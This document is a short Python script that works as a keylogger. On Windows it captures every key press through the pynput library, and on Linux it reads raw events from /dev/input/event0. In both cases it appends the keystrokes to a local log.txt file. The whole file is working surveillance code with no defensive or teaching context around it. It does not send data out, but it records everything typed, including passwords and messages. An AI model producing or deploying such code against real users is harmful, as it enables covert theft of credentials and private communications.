import platform
import struct
import time
import os

# Get the directory of the current script
script_dir = os.path.dirname(os.path.abspath(__file__))

# Check the operating system
is_windows = platform.system() == "Windows"

if is_windows:
    from pynput import keyboard

    output_file = os.path.join(script_dir, "log.txt")
    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    def on_press(key):
        try:
            with open(output_file, "a") as log:
                if key == keyboard.Key.space:
                    log.write("SPACE ")
                elif key == keyboard.Key.backspace:
                    log.write("BACKSPACE ")
                elif key == keyboard.Key.enter:
                    log.write("ENTER ")
                else:
                    log.write(f"{key.char} ")
        except AttributeError:
            pass

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

else:
    # Path to the input device (you may need to change this to the correct event number)
    input_device = "/dev/input/event0"
    output_file = os.path.join(script_dir, "log.txt")

    # Key codes for special keys (these may vary depending on your keyboard layout)
    SPACE_KEY_CODE = 57
    BACKSPACE_KEY_CODE = 14
    ENTER_KEY_CODE = 28

    # Open the input device file
    with open(input_device, "rb") as f, open(output_file, "a") as log:
        while True:
            # Read the event structure (24 bytes)
            event = f.read(24)
            if len(event) < 24:
                break

            # Unpack the event structure
            (tv_sec, tv_usec, ev_type, ev_code, ev_value) = struct.unpack('llHHI', event)

            # Check if the event is a key press event
            if ev_type == 1 and ev_value == 1:  # EV_KEY and key press
                # Write the key code to the log file with a space
                if ev_code == SPACE_KEY_CODE:
                    log.write("SPACE ")
                elif ev_code == BACKSPACE_KEY_CODE:
                    log.write("BACKSPACE ")
                elif ev_code == ENTER_KEY_CODE:
                    log.write("ENTER ")
                else:
                    log.write(f"{ev_code} ")
                log.flush()  # Ensure the data is written to the file immediately

            # Sleep for a short time to avoid overwhelming the output
            time.sleep(0.01)